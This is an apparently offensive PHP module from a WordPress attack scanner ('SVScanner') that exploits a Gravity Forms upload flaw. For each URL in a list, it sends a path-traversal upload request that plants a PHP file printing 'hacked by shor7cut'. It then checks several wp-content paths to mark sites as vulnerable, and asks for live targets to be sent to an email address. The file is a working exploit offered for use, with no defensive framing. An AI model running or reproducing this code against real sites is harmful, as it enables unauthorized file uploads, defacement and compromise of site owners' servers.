<?php
error_reporting(0);
/**
 * @Author: Eka Syahwan
 * @Date:   2018-09-06 23:02:10
 * @Last Modified by:   Eka Syahwan
 * @Last Modified time: 2018-09-14 15:31:54
 */
class Exploit_Plugins_gravityforms
{
	function __construct()
	{
		$this->wploit_modules 	= new wploit_modules;
		$this->sdata 			= new Sdata;
		$this->database 		= new Database;
	}
	function scanner($array_url , $datcommand){
		##########################################################################
		mkdir("result");
		mkdir("result/exploit");
		$fopn = fopen("result/exploit/gravityforms.txt", "a+");
		##########################################################################
		echo "\r\n".$this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Trying exploits ... [ ".count($array_url)." Request | ".$datcommand."]\r\n");
		foreach ($array_url as $key => $dataURL) {
			$url[] 				=  array('url' 		=> $dataURL['url']."/?gf_page=upload");
			
			$urlCheckShell[] 	=  array('url' 		=> $dataURL['url']."/wp-content/_input_3_khan.php5");
			$urlCheckShell[] 	=  array('url' 		=> $dataURL['url']."/wp-content/uploads/_input_3_khan.php5");
			$urlCheckShell[] 	=  array('url' 		=> $dataURL['url']."/wp-content/uploads/gravity_forms/_input_3_khan.php5");

			$hea[] 				=  array('follow' 	=> false,'post' => "<?php echo 'hacked by shor7cut';?>&form_id=1&name=khan.php5&gform_unique_id=../../../../&field_id=3");
		}
		$respons   			= $this->sdata->sdata($url,$hea); $this->sdata->session_remove($respons);

		echo "\r\n".$this->wploit_modules->color("green","[SVScanner] "). $this->wploit_modules->color("navy","Checking shell ... [ ".count($urlCheckShell)." Request ]\r\n");
		
		$urlCheckShell   	= $this->sdata->sdata($urlCheckShell); $this->sdata->session_remove($respons);
		foreach ($urlCheckShell as $key => $res) {
			if(preg_match("/hacked by shor7cut/", $res['respons'])){
				echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$res['info']['http_code']."] ".$res['info']['url'])." => ".$this->wploit_modules->color("green","[ VULN ]")."\r\n";
				print_r($res);
				die('pleas live target send to : maunikah1337@gmail.com for my dev tools');
			}else{
				echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$res['info']['http_code']."] ".$res['info']['url'])." => ".$this->wploit_modules->color("green","[ NOT VULN ]")."\r\n";
			}
		}
		unset($url);unset($hea);unset($urlCheckShell);
		fclose($fopn);
		unset($_SESSION['temp_size']);

	}
}